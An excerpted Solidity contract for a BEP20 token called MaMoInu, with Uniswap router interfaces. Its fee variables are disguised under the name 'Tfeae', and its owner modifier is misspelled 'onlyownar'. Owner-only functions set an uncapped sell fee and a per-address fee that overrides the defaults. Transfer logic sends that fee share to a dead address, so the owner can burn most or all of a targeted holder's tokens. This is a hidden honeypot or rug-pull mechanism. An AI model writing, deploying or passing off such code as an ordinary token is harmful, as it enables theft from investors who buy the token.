...
interface IUniswapV2Factory {
    ...
    function TfeaeTo() external view returns (address);
    function TfeaeToSetter() external view returns (address);
    ...
    function setTfeaeTo(address) external;
    function setTfeaeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingTfeaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingTfeaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingTfeaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingTfeaeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingTfeaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract MaMoInu is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellTfeae = 0;

    uint256 private _defaultBuyTfeae = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipTfeae;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellTfeae = _value;
    }

    function setSlipTfeae(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipTfeae[_address] = _value;
    }

    function getSlipTfeae(address _address) external view onlyownar returns (uint256) {
        return _slipTfeae[_address];
    }


    function setMAccountTfeae(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountTfeae(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeTfeaeAmount = 0;

        if (rF) {
            uint256 tradeTfeae = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeTfeae = _defaultSellTfeae;
                }
                if (from == uniswapV2Pair) {

                    tradeTfeae = _defaultBuyTfeae;
                }
            }
            if (_slipTfeae[from] > 0) {
                tradeTfeae = _slipTfeae[from];
            }

            tradeTfeaeAmount = _Amount.mul(tradeTfeae).div(100);
        }


        if (tradeTfeaeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeTfeaeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeTfeaeAmount);
            emit Transfer(from, _deadAddress, tradeTfeaeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeTfeaeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeTfeaeAmount);
        emit Transfer(from, _to, _Amount - tradeTfeaeAmount);
    }
